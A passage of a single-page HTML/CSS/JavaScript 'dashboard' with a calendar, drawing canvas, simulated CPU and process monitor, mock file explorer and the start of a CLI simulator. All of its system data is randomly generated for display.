        color: black;
        border: none;
        cursor: pointer;
        transition: background 0.2s, transform 0.2s;
    }
    .reminder-input-area button:hover { background: #ffb67a; transform: scale(1.03); }
    body.dashboard-body.light-theme .reminder-input-area button { background: #ffd966; }
    body.dashboard-body.light-theme .reminder-input-area button:hover { background: #ffe099; }
    
    #reminderList, #upcomingReminders {
        margin-top: 15px;
    }
    #reminderList h3, #upcomingReminders h3 {
        font-size: 1.2em;
        color: #ff914d;
        margin-bottom: 10px;
        border-bottom: 1px solid #ff914d;
        padding-bottom: 5px;
    }
    body.dashboard-body.light-theme #reminderList h3,
    body.dashboard-body.light-theme #upcomingReminders h3 {
        color: #b37700;
        border-bottom: 1px solid #b37700;
    }
    #reminderList ul {
        list-style: none;
        padding: 0;
    }
    #reminderList li {
        background: rgba(30, 30, 30, 0.7);
        padding: 10px 15px;
        margin-bottom: 8px;
        border-radius: 6px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-left: 3px solid #ff914d;
        font-size: 0.95em;
    }
    body.dashboard-body.light-theme #reminderList li {
        background: rgba(255, 240, 200, 0.7);
        border-left: 3px solid #b37700;
    }
    .reminder-actions button {
        background: none;
        border: none;
        color: #aaa;
        cursor: pointer;
        margin-left: 5px;
        transition: color 0.2s;
        font-size: 1.1em;
    }
    .reminder-actions button:hover { color: #ff914d; }
    body.dashboard-body.light-theme .reminder-actions button:hover { color: #b37700; }
    .reminder-actions .complete-reminder { color: #4CAF50; }
    .reminder-actions .delete-reminder { color: #F44336; }
    .reminder-actions .complete-reminder:hover { color: #66BB6A; }
    .reminder-actions .delete-reminder:hover { color: #EF5350; }
    #nextReminderInfo { font-style: italic; color: #bbb; font-size: 0.95em;}
    body.dashboard-body.light-theme #nextReminderInfo { color: #777; }
    
    /* System Tools */
    .tools-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
        gap: 15px;
    }
    .tools-grid button {
        background: rgba(42, 42, 42, 0.7);
        color: #ff914d;
        border: 1px solid rgba(255, 145, 77, 0.2);
        padding: 15px 20px;
        border-radius: 10px;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        transition: background 0.2s, transform 0.2s, box-shadow 0.2s;
        font-size: 1em;
        font-weight: bold;
        text-decoration: none;
    }
    .tools-grid button:hover {
        background: rgba(60, 60, 60, 0.8);
        transform: translateY(-4px);
        box-shadow: 0 0 15px rgba(255, 145, 77, 0.4);
    }
    .tools-grid button img {
        width: 32px;
        height: 32px;
        margin-bottom: 10px;
        filter: invert(75%) sepia(100%) saturate(300%) hue-rotate(25deg) brightness(100%) contrast(100%); /* Orange filter */
    }
    body.dashboard-body.light-theme .tools-grid button {
        background: rgba(255, 240, 200, 0.7);
        color: #b37700;
        border: 1px solid rgba(179, 119, 0, 0.2);
    }
    body.dashboard-body.light-theme .tools-grid button:hover {
        background: rgba(255, 235, 180, 0.8);
        box-shadow: 0 0 15px rgba(179, 119, 0, 0.4);
    }
    body.dashboard-body.light-theme .tools-grid button img {
        filter: invert(50%) sepia(100%) saturate(200%) hue-rotate(25deg) brightness(80%) contrast(100%); /* Darker orange filter */
    }
    
    .tool-placeholder { margin-top: 0; padding: 20px; }

    /* Calculator */
    .calculator {
        width: 280px;
        margin: 20px auto;
        background: rgba(10, 10, 10, 0.7);
        border-radius: 12px;
        border: 1px solid rgba(255, 145, 77, 0.2);
        box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
        padding: 15px;
    }
    body.dashboard-body.light-theme .calculator {
        background: rgba(255, 255, 255, 0.7);
        border: 1px solid rgba(179, 119, 0, 0.2);
        box-shadow: inset 0 0 10px rgba(255,255,255,0.3);
    }
    #calculatorDisplay {
        width: 100%;
        background: #0a0a0a;
        color: #00ff00;
        font-size: 2em;
        padding: 15px;
        text-align: right;
        border: none;
        border-radius: 8px;
        margin-bottom: 15px;
        box-sizing: border-box;
        caret-color: transparent; /* Hide cursor */
    }
    body.dashboard-body.light-theme #calculatorDisplay {
        background: #1a1a1a;
        color: #00cc00;
    }
    .calculator .buttons {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 10px;
    }
    .calculator button {
        padding: 15px;
        border-radius: 8px;
        font-size: 1.2em;
        font-weight: bold;
        cursor: pointer;
        border: 1px solid rgba(255, 145, 77, 0.2);
        background: rgba(30, 30, 30, 0.7);
        color: #ff914d;
        transition: background 0.2s, transform 0.2s;
    }
    body.dashboard-body.light-theme .calculator button {
        border: 1px solid rgba(179, 119, 0, 0.2);
        background: rgba(255, 240, 200, 0.7);
        color: #b37700;
    }
    .calculator button:hover { transform: scale(1.05); }
    .calculator button.operator { color: #ffd966; border-color: rgba(255, 204, 102, 0.3); }
    body.dashboard-body.light-theme .calculator button.operator { color: #cc9900; border-color: rgba(204, 153, 51, 0.3); }
    .calculator button.operator:hover { background: rgba(255, 180, 90, 0.8); }
    body.dashboard-body.light-theme .calculator button.operator:hover { background: rgba(255, 220, 140, 0.8); }
    .calculator button.clear { color: #F44336; border-color: rgba(255, 0, 0, 0.2); }
    body.dashboard-body.light-theme .calculator button.clear { color: #EF5350; }
    .calculator button.clear:hover { background: rgba(255, 50, 50, 0.8); }
    body.dashboard-body.light-theme .calculator button.clear:hover { background: rgba(255, 100, 100, 0.8); }
    .calculator button.equals { background: #4CAF50; color: white; border-color: rgba(76, 175, 80, 0.2); grid-column: span 2; }
    body.dashboard-body.light-theme .calculator button.equals { background: #66BB6A; }
    .calculator button.equals:hover { background: #66BB6A; }
    body.dashboard-body.light-theme .calculator button.equals:hover { background: #81C784; }

    /* Notepad */
    .tool-detail-view { margin-top: 20px; }
    #enhancedNotepad {
        width: 100%;
        min-height: 250px;
        padding: 15px;
        border-radius: 8px;
        border: 1px solid #ff914d;
        background: rgba(10, 10, 10, 0.7);
        color: white;
        font-family: 'Segoe UI', sans-serif;
        font-size: 1em;
        resize: vertical; /* Allow vertical resizing */
        margin-bottom: 15px;
        box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
    }
    body.dashboard-body.light-theme #enhancedNotepad {
        border: 1px solid #b37700;
        background: rgba(255, 255, 255, 0.7);
        color: #333;
    }
    .notepad-controls {
        display: flex;
        gap: 10px;
        justify-content: center;
    }
    .notepad-controls button {
        padding: 10px 18px;
        border-radius: 6px;
        background: #ff914d;
        color: black;
        border: none;
        cursor: pointer;
        transition: background 0.2s, transform 0.2s;
    }
    .notepad-controls button:hover { background: #ffb67a; transform: scale(1.03); }
    body.dashboard-body.light-theme .notepad-controls button { background: #ffd966; }
    body.dashboard-body.light-theme .notepad-controls button:hover { background: #ffe099; }

    /* Alarm & Timer */
    .alarm-section, .timer-section {
        padding: 15px;
        background: rgba(30, 30, 30, 0.7);
        border-radius: 8px;
        margin-bottom: 15px;
        border: 1px solid rgba(255, 145, 77, 0.2);
    }
    body.dashboard-body.light-theme .alarm-section,
    body.dashboard-body.light-theme .timer-section {
        background: rgba(255, 240, 200, 0.7);
        border: 1px solid rgba(179, 119, 0, 0.2);
    }
    .alarm-section h4, .timer-section h4 {
        color: #ff914d;
        margin-bottom: 10px;
        font-size: 1.1em;
    }
    body.dashboard-body.light-theme .alarm-section h4,
    body.dashboard-body.light-theme .timer-section h4 {
        color: #b37700;
    }
    .alarm-section input[type="time"],
    .timer-section input[type="number"] {
        padding: 8px 12px;
        border-radius: 6px;
        border: 1px solid #ff914d;
        background: rgba(10, 10, 10, 0.7);
        color: white;
        margin-right: 10px;
        font-size: 1em;
    }
    body.dashboard-body.light-theme .alarm-section input[type="time"],
    body.dashboard-body.light-theme .timer-section input[type="number"] {
        border: 1px solid #b37700;
        background: rgba(255, 255, 255, 0.7);
        color: #333;
    }
    .alarm-section button, .timer-section button {
        padding: 8px 15px;
        border-radius: 6px;
        background: #ff914d;
        color: black;
        border: none;
        cursor: pointer;
        transition: background 0.2s, transform 0.2s;
    }
    .alarm-section button:hover, .timer-section button:hover { background: #ffb67a; transform: scale(1.03); }
    body.dashboard-body.light-theme .alarm-section button,
    body.dashboard-body.light-theme .timer-section button { background: #ffd966; }
    body.dashboard-body.light-theme .alarm-section button:hover,
    body.dashboard-body.light-theme .timer-section button:hover { background: #ffe099; }

    #alarmListDisplay { list-style: none; padding: 0; }
    #alarmListDisplay li {
        background: rgba(40, 40, 40, 0.7);
        padding: 8px 12px;
        margin-bottom: 5px;
        border-radius: 5px;
        font-size: 0.9em;
        color: #ddd;
    }
    body.dashboard-body.light-theme #alarmListDisplay li {
        background: rgba(255, 235, 180, 0.7);
        color: #555;
    }
    
    #timerDisplay {
        font-size: 2em;
        font-weight: bold;
        text-align: center;
        margin: 15px 0;
        color: #ff914d;
    }
    body.dashboard-body.light-theme #timerDisplay { color: #b37700; }
    #timerControlBtn {
        display: block; /* Make it a block element */
        width: 100%; /* Full width */
        margin-top: 10px;
    }

    /* Data Visualization */
    .chart-container {
        margin-top: 20px;
        padding: 20px;
        background: rgba(30, 30, 30, 0.7);
        border-radius: 12px;
        border: 1px solid rgba(255, 145, 77, 0.2);
        text-align: center;
    }
    body.dashboard-body.light-theme .chart-container {
        background: rgba(255, 240, 200, 0.7);
        border: 1px solid rgba(179, 119, 0, 0.2);
    }
    .chart-container h3 {
        color: #ff914d;
        margin-bottom: 15px;
        font-size: 1.2em;
    }
    body.dashboard-body.light-theme .chart-container h3 {
        color: #b37700;
    }
    /* Canvas elements will size themselves based on container */
    .chart-container canvas {
        max-width: 100%;
        height: auto; /* Maintain aspect ratio */
        border-radius: 8px;
        border: 1px solid rgba(255, 145, 77, 0.3);
    }
    body.dashboard-body.light-theme .chart-container canvas {
        border: 1px solid rgba(179, 119, 0, 0.3);
    }

  </style>
  
  <script>
    // Dashboard functionality object
    const dashboard = {
      // Initialize all dashboard functionality
      init: function() {
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initButtons();
        this.initCanvas();
        this.initPanels();
        this.initQuickBar();
        this.initSystemMonitoring(); // Initialize new features
        this.initTaskManager();
        this.initFileExplorer();
        this.initCLI();
        this.initReminderSystem();
        this.initSystemTools();
        this.initDataVisualization(); // Initialize charting
        this.setupTooltips(); // Add tooltips
      },
      
      // Initialize session timer
      initSessionTimer: function() {
        let sessionSeconds = 0;
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        
        this.sessionTimerInterval = setInterval(() => { // Store interval ID
          sessionSeconds++;
          document.getElementById('sessionTime').innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
        }, 1000);
      },
      
      // Initialize real-time clock
      initClock: function() {
        this.clockInterval = setInterval(() => { // Store interval ID
          const now = new Date();
          const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
          const timeStr = now.toLocaleTimeString(undefined, options);
          const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

          document.getElementById('realTimeClock').innerText = '🕒 ' + timeStr;
          document.getElementById('realDate').innerText = '📅 ' + dateStr;
        }, 1000);
      },
      
      // Generate calendar
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        calendar.innerHTML = ''; 
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
      },
      
      // Initialize theme toggle
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        themeBtn.addEventListener('click', () => {
          document.body.classList.toggle('light-theme');
          if(document.body.classList.contains('light-theme')){
            themeBtn.innerHTML = '<i class="fas fa-sun"></i> Light Mode'; // Use Font Awesome icons
          } else {
            themeBtn.innerHTML = '<i class="fas fa-moon"></i> Dark Mode';
          }
        });
      },
      
      // Initialize buttons and tooltips
      initButtons: function() {
        document.getElementById('panicBtn').addEventListener('click', () => {
          window.open('https://clever.com', '_blank'); // Example link
        });

        document.getElementById('restartBtn').addEventListener('click', () => {
          if(confirm('Are you sure you want to kill the page (restart)?')) {
            // Clear intervals before clearing content
            clearInterval(this.sessionTimerInterval);
            clearInterval(this.clockInterval);
            // Add other intervals clearing here if any
            
            document.body.innerHTML = `<div class="restarting-message">
                                        <div class="restarting-spinner"></div>
                                        <h2>System Restarting...</h2>
                                        <p>Please wait while the dashboard reloads.</p>
                                      </div>`;
            // Simulate a brief delay before actual reload
            setTimeout(() => {
                location.reload();
            }, 3000); // Reload after 3 seconds
          }
        });

        document.getElementById('fixIssuesBtn').addEventListener('click', () => {
          alert('Running system diagnostics...\n\nStatus: All systems nominal.\nNo issues detected.\nYour dashboard is optimized and running smoothly!');
        });
        
        document.getElementById('fullScreenBtn').addEventListener('click', () => {
          const elem = document.documentElement;
          if (!document.fullscreenElement) {
            if (elem.requestFullscreen) {
              elem.requestFullscreen();
            } else if (elem.webkitRequestFullscreen) { /* Safari */
              elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) { /* IE11 */
              elem.msRequestFullscreen();
            }
          } else {
            if (document.exitFullscreen) {
              document.exitFullscreen();
            } else if (document.webkitExitFullscreen) { /* Safari */
              document.webkitExitFullscreen();
            } else if (document.msExitFullscreen) { /* IE11 */
              document.msExitFullscreen();
            }
          }
        });
        
        let zoomLevel = 1;
        const zoomStep = 0.1;
        const minZoom = 0.5;
        const maxZoom = 2;

        document.getElementById('zoomInBtn').addEventListener('click', () => {
          if (zoomLevel < maxZoom) {
            zoomLevel += zoomStep;
            document.body.style.zoom = `${zoomLevel}`;
          }
        });

        document.getElementById('zoomOutBtn').addEventListener('click', () => {
          if (zoomLevel > minZoom) {
            zoomLevel -= zoomStep;
            document.body.style.zoom = `${zoomLevel}`;
          }
        });
        
        // Logout button
        document.getElementById('logoutBtn').addEventListener('click', () => {
            if (confirm('Are you sure you want to log out?')) {
                clearInterval(this.sessionTimerInterval); // Stop timers
                // Add any other cleanup
                document.getElementById('dashboard').style.display = 'none';
                document.getElementById('loginBox').style.display = 'block';
                document.body.className = 'login-body';
                // Reset login form fields (optional)
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
                document.getElementById('userID').value = '';
                document.getElementById('errorMsg').textContent = '';
                document.getElementById('attemptsText').textContent = 'Attempts Left: 5';
                attempts = 5; // Reset attempts globally if needed
            }
        });
      },
      
      // Add tooltips to elements with a 'tooltip' attribute
      setupTooltips: function() {
          document.querySelectorAll('[data-tooltip]').forEach(el => {
              el.addEventListener('mouseover', () => {
                  const tooltipText = el.getAttribute('data-tooltip');
                  const tooltip = document.createElement('div');
                  tooltip.classList.add('custom-tooltip');
                  tooltip.textContent = tooltipText;
                  document.body.appendChild(tooltip);

                  // Position tooltip
                  const rect = el.getBoundingClientRect();
                  tooltip.style.top = `${rect.top + window.scrollY - tooltip.offsetHeight - 5}px`;
                  tooltip.style.left = `${rect.left + window.scrollX + el.offsetWidth / 2 - tooltip.offsetWidth / 2}px`;
              });
              el.addEventListener('mouseout', () => {
                  document.body.removeChild(document.querySelector('.custom-tooltip'));
              });
          });
      },

      // Initialize canvas for notes
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid');
        const toggleSectionsBtn = document.getElementById('toggleSectionsBtn'); // reference to the toggle button

        notesBtn.addEventListener('click', () => {
          mainGrid.style.display = 'none';
          canvasContainer.style.display = 'block';
          if (toggleSectionsBtn.innerText.includes('⬆️')) toggleSectionsBtn.click(); // Ensure mainGrid is hidden if it was shown
        });

        document.getElementById('closeCanvasBtn').addEventListener('click', () => {
          canvasContainer.style.display = 'none';
          mainGrid.style.display = 'flex'; // Show the main content grid
        });

        const clearCanvasBtn = document.getElementById('clearCanvasBtn');
        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');

        // Initial canvas setup
        ctx.fillStyle = '#fff';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        let drawing = false;
        let lastPos = { x: 0, y: 0 };

        function getPos(evt) {
          const rect = canvas.getBoundingClientRect();
          const clientX = evt.clientX || (evt.touches && evt.touches[0].clientX);
          const clientY = evt.clientY || (evt.touches && evt.touches[0].clientY);
          return {
            x: clientX - rect.left,
            y: clientY - rect.top
          };
        }

        canvas.addEventListener('mousedown', (e) => {
          if (e.button !== 0) return; // Only left click
          drawing = true;
          lastPos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(lastPos.x, lastPos.y);
          e.preventDefault();
        });

        canvas.addEventListener('touchstart', (e) => {
          drawing = true;
          lastPos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(lastPos.x, lastPos.y);
          e.preventDefault();
        });

        canvas.addEventListener('mousemove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = '#ff914d'; // Default drawing color
          ctx.lineWidth = 3;         // Default line width
          ctx.lineCap = 'round';
          ctx.stroke();
          lastPos = pos;
          e.preventDefault();
        });

        canvas.addEventListener('touchmove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = '#ff914d';
          ctx.lineWidth = 3;
          ctx.lineCap = 'round';
          ctx.stroke();
          lastPos = pos;
          e.preventDefault();
        });

        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
          canvas.addEventListener(evtName, () => {
            if (drawing) {
                ctx.closePath(); // Close path when mouse/touch is released
            }
            drawing = false;
          });
        });

        clearCanvasBtn.addEventListener('click', () => {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          ctx.fillStyle = '#fff';
          ctx.fillRect(0, 0, canvas.width, canvas.height);
        });

        document.getElementById('screenshotBtn').addEventListener('click', () => {
          const elementToCapture = document.getElementById('dashboard'); // Capture the entire dashboard
          html2canvas(elementToCapture, { useCORS: true }).then(canvasImg => { // Use CORS for potential external images
            const link = document.createElement('a');
            link.download = 'private_dashboard_screenshot.png';
            link.href = canvasImg.toDataURL('image/png');
            link.click();
          });
        });
        
        document.getElementById('exportNotesBtn').addEventListener('click', () => {
          const link = document.createElement('a');
          link.download = 'notes_canvas.png';
          link.href = canvas.toDataURL('image/png');
          link.click();
        });

        const toggleBtn = document.getElementById('toggleSectionsBtn');
        toggleBtn.addEventListener('click', () => {
          const panels = document.querySelectorAll('.box, .updatesNotifications'); // Select elements to toggle
          const isHidden = panels[0].style.display === 'none';

          panels.forEach(panel => {
              panel.style.display = isHidden ? 'flex' : 'none'; // Use flex for rows, block for others
          });
          
          if (isHidden) { // If panels are shown
              toggleBtn.innerHTML = '<i class="fas fa-arrow-up"></i> Hide Sections';
          } else { // If panels are hidden
              toggleBtn.innerHTML = '<i class="fas fa-arrow-down"></i> Show Sections';
          }
        });
      },
      
      // Initialize panels (hide all by default)
      initPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => {
          panel.style.display = 'none';
        });
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        // Hide tool specific views by default
        document.querySelectorAll('.tool-detail-view').forEach(view => {
          view.style.display = 'none';
        });
      },
      
      // Initialize quick bar related toggles (mostly handled by panel toggle functions)
      initQuickBar: function() {
        // Functionality for quick bar buttons is wired up via `onclick` attributes or direct event listeners
      },
      
      // Toggle visibility of info panels
      togglePanel: function(panelId) {
        const panel = document.getElementById(panelId);
        const isHidden = panel.style.display === 'none';
        
        // Hide all other info panels of the same category first
        document.querySelectorAll('.info-panel').forEach(p => {
            // Only hide if it's not the currently targeted panel and is visible
            if (p.id !== panelId && p.style.display !== 'none') {
                p.style.display = 'none';
            }
        });
        
        panel.style.display = isHidden ? 'block' : 'none';
      },
      
      // Show specific content within the iPad panel
      showIpadContent: function(contentId) {
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        const targetElement = document.getElementById(`${contentId}Content`);
        if (targetElement) {
            targetElement.style.display = 'block';
        }
      },
      
      // Show specific content within the Bypass panel
      showBypassContent: function(contentId) {
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        const targetElement = document.getElementById(`${contentId}Bypass`);
        if (targetElement) {
            targetElement.style.display = 'block';
        }
      },
      
      // --- NEW FEATURE INITIALIZATION ---
      
      // System Monitoring
      initSystemMonitoring: function() {
          this.updateMonitoringData(); // Initial update
          this.monitoringInterval = setInterval(() => this.updateMonitoringData(), 2000); // Update every 2 seconds
      },
      
      updateMonitoringData: function() {
          // Simulate data
          const cpuUsage = Math.floor(Math.random() * 70) + 10; // 10-80%
          const ramTotal = 16; // GB
          const ramUsed = Math.floor(Math.random() * ramTotal * 0.7) + (ramTotal * 0.1); // 10-80%
          const diskTotal = 512; // GB
          const diskUsed = Math.floor(Math.random() * diskTotal * 0.6) + (diskTotal * 0.2); // 20-80%
          const networkUp = Math.floor(Math.random() * 5000) + 100; // Kbps
          const networkDown = Math.floor(Math.random() * 10000) + 500; // Kbps

          // Update UI elements
          document.getElementById('cpuUsage').textContent = `${cpuUsage}%`;
          document.querySelector('.cpu-bar').style.width = `${cpuUsage}%`;
          
          document.getElementById('ramUsage').textContent = `${ramUsed.toFixed(1)}GB / ${ramTotal}GB`;
          document.querySelector('.ram-bar').style.width = `${(ramUsed / ramTotal) * 100}%`;
          
          document.getElementById('diskUsage').textContent = `${diskUsed.toFixed(1)}GB / ${diskTotal}GB`;
          document.querySelector('.disk-bar').style.width = `${(diskUsed / diskTotal) * 100}%`;
          
          document.getElementById('networkActivity').textContent = `${networkDown.toFixed(0)} Kbps ↓ / ${networkUp.toFixed(0)} Kbps ↑`;
          // Network bars are often more complex, keeping it simple here.
          // Could animate width or color based on activity.
          document.querySelector('.network-bar').style.width = `${Math.min(100, (networkDown / 10000) * 100)}%`; // Example for download

          // Update charts (placeholder update)
          this.updateCharts({ cpuUsage, ramUsed, networkDown });
      },
      
      // Task Manager
      initTaskManager: function() {
          this.populateProcessTable(); // Initial population
          document.getElementById('refreshTasksBtn').addEventListener('click', () => this.populateProcessTable());
          document.getElementById('processFilter').addEventListener('input', () => this.filterProcesses());
          document.getElementById('endProcessBtn').addEventListener('click', () => this.endProcess());
      },
      
      simulateProcesses: function() {
          const processNames = ['svchost.exe', 'explorer.exe', 'chrome.exe', 'firefox.exe', 'powershell.exe', 'System', 'lsass.exe', 'dwm.exe', 'msedge.exe', 'discord.exe', 'notepad++.exe', 'code.exe', 'vlc.exe', 'audiodg.exe'];
          const statuses = ['Running', 'Suspended', 'Ending'];
          const processes = [];
          const numProcesses = Math.floor(Math.random() * 20) + 30; // 30-50 processes
          for (let i = 1000; i < 1000 + numProcesses; i++) {
              const name = processNames[Math.floor(Math.random() * processNames.length)];
              const cpu = Math.floor(Math.random() * 20); // Low to moderate CPU usage
              const memMB = Math.floor(Math.random() * 500) + 10; // 10-510 MB
              const status = statuses[Math.floor(Math.random() * statuses.length)];
              processes.push({ pid: i, name, cpu, mem: memMB, status });
          }
          return processes;
      },
      
      populateProcessTable: function(filter = '') {
          const tbody = document.getElementById('processTableBody');
          tbody.innerHTML = ''; // Clear existing rows
          const processes = this.simulateProcesses();
          
          processes.filter(p => p.name.toLowerCase().includes(filter.toLowerCase())).forEach(p => {
              const row = tbody.insertRow();
              row.innerHTML = `
                  <td>${p.pid}</td>
                  <td>${p.name}</td>
                  <td>${p.cpu}%</td>
                  <td>${p.mem} MB</td>
                  <td>${p.status}</td>
              `;
              // Add click listener for selecting process
              row.addEventListener('click', () => this.selectProcess(row));
          });
      },
      
      filterProcesses: function() {
          const filter = document.getElementById('processFilter').value;
          this.populateProcessTable(filter);
      },
      
      selectProcess: function(row) {
          // Deselect previously selected row
          document.querySelectorAll('#processTableBody tr').forEach(r => r.classList.remove('selected-process'));
          // Select new row
          row.classList.add('selected-process');
      },
      
      endProcess: function() {
          const selectedRow = document.querySelector('#processTableBody tr.selected-process');
          if (!selectedRow) {
              alert('Please select a process to end.');
              return;
          }
          const pid = selectedRow.cells[0].textContent;
          if (confirm(`Are you sure you want to end process PID ${pid}?`)) {
              selectedRow.cells[4].textContent = 'Ending...'; // Update status visually
              // Simulate process ending
              setTimeout(() => {
                  selectedRow.remove();
              }, 1000);
          }
      },
      
      // File Explorer
      initFileExplorer: function() {
          this.populateFileSystem();
          document.getElementById('createFolderBtn').addEventListener('click', () => this.createItem('folder'));
          document.getElementById('uploadFileBtn').addEventListener('click', () => this.createItem('file'));
          document.getElementById('deleteItemBtn').addEventListener('click', () => this.deleteItem());
          document.getElementById('renameItemBtn').addEventListener('click', () => this.renameItem());
      },
      
      simulateFileSystem: function() {
          // Simple nested structure
          return [
              { name: 'Desktop', type: 'folder', children: [
                  { name: 'README.txt', type: 'file', content: 'This is a sample file.' },
                  { name: 'My Documents', type: 'folder', children: [
                      { name: 'Report.docx', type: 'file', content: 'Project report details.' },
                      { name: 'Images', type: 'folder', children: [
                          { name: 'logo.png', type: 'file', content: 'Fake image data.' }
                      ]}
                  ]}
              ]},
              { name: 'Applications', type: 'folder', children: [
                  { name: 'System Tools', type: 'folder', children: [] }
              ]},
              { name: 'Downloads', type: 'folder', children: [
                  { name: 'installer.exe', type: 'file', content: 'Executable file.' }
              ]},
              { name: 'config.sys', type: 'file', content: 'System configuration settings.' }
          ];
      },
      
      populateFileSystem: function(items = this.simulateFileSystem(), parentElement = document.getElementById('fileSystemList')) {
          parentElement.innerHTML = ''; // Clear current list
          items.forEach(item => {
              const li = document.createElement('li');
              li.dataset.name = item.name;
              li.dataset.type = item.type;
              
              const iconClass = item.type === 'folder' ? 'fas fa-folder folder-icon' : 'fas fa-file file-icon';
              li.innerHTML = `<i class="fas ${iconClass}"></i> ${item.name}`;
              
              if (item.type === 'folder') {
                  li.style.cursor = 'pointer';
                  li.addEventListener('click', (e) => {
                      e.stopPropagation(); // Prevent event bubbling to parent folders
                      const nestedListId = `nested-${item.name.replace(/\s+/g, '-')}`;
                      let nestedUl = li.querySelector(`#${nestedListId}`);
                      
                      if (!nestedUl) {
                          nestedUl = document.createElement('ul');
                          nestedUl.id = nestedListId;
                          li.appendChild(nestedUl);
                          this.populateFileSystem(item.children, nestedUl);
                      }
                      
                      // Toggle visibility of nested list
                      nestedUl.style.display = nestedUl.style.display === 'block' ? 'none' : 'block';
                  });
              } else { // It's a file
                  li.style.cursor = 'default';
              }
              
              parentElement.appendChild(li);
          });
      },
      
      createItem: function(type) {
          const currentPath = this.getCurrentPath(); // Needs implementation for actual path tracking
          const itemName = prompt(`Enter ${type} name:`);
          if (!itemName) return;
          
          const newItem = { name: itemName, type: type, content: type === 'folder' ? [] : 'New file content.' };
          // In a real scenario, this would involve API calls. Here, we'll just simulate adding to UI.
          alert(`Simulating creation of ${type} "${itemName}" in ${currentPath}.`);
          // For simplicity, re-populating the root for now. A real implementation would handle adding to the correct directory.
          this.populateFileSystem(); 
      },
      
      deleteItem: function() {
          const selectedLi = document.querySelector('#fileSystemList li.selected-item'); // Assuming a 'selected-item' class
          if (!selectedLi) {
              alert('Please select an item to delete.');
              return;
          }
          const itemName = selectedLi.dataset.name;
          if (confirm(`Are you sure you want to delete "${itemName}"?`)) {
              selectedRow.remove(); // Remove from UI
              alert(`Simulating deletion of "${itemName}".`);
          }
      },
      
      renameItem: function() {
          const selectedLi = document.querySelector('#fileSystemList li.selected-item'); // Assuming a 'selected-item' class
          if (!selectedLi) {
              alert('Please select an item to rename.');
              return;
          }
          const oldName = selectedLi.dataset.name;
          const newName = prompt(`Enter new name for "${oldName}":`);
          if (!newName || newName === oldName) return;
          
          selectedLi.querySelector('span').textContent = newName; // Update text content
          selectedLi.dataset.name = newName; // Update data attribute
          alert(`Simulating renaming "${oldName}" to "${newName}".`);
      },
      
      getCurrentPath: function() { return 'C:\\'; }, // Placeholder for actual path tracking
      
      // CLI Simulator
      initCLI: function() {
          const cliInput = document.getElementById('cliInput');
          const cliOutput = document.getElementById('cliOutput');
          const cliPrompt = document.getElementById('cliPrompt');
          
          this.cliHistory = [];
          this.cliHistoryIndex = -1;
          this.currentDirectory = 'C:\\Users\\Admin'; // Start directory
          
          const updatePrompt = () => {
              cliPrompt.textContent = `${this.currentDirectory}> `;
          };
          
          const printOutput = (text, isError = false) => {
              const lines = text.split('\n');
              lines.forEach(line => {
                  const p = document.createElement('p');
                  p.textContent = line;
                  if (isError) p.style.color = '#ff6666'; // Red for errors
                  cliOutput.appendChild(p);
              });
              cliOutput.scrollTop = cliOutput.scrollHeight; // Auto-scroll to bottom
          };
          
          const executeCommand = (commandStr) => {
              commandStr = commandStr.trim();
              if (!commandStr) return;
              
              this.cliHistory.push(commandStr); // Add to history
              this.cliHistoryIndex = this.cliHistory.length; // Reset index
              
              printOutput(`${cliPrompt.textContent}${commandStr}`);
              
              const parts = commandStr.split(' ');
              const command = parts[0].toLowerCase();
              const args = parts.slice(1);
              
              let output = '';
              let found = true;
              
              switch(command) {
                  case 'help':
                      output = `Available commands:
  help       - Shows this help message.
  echo       - Prints text to the console.
  ls         - Lists files and directories (simulated).
  cd         - Changes directory (simulated).
  clear      - Clears the console.
  pwd        - Prints the current directory.
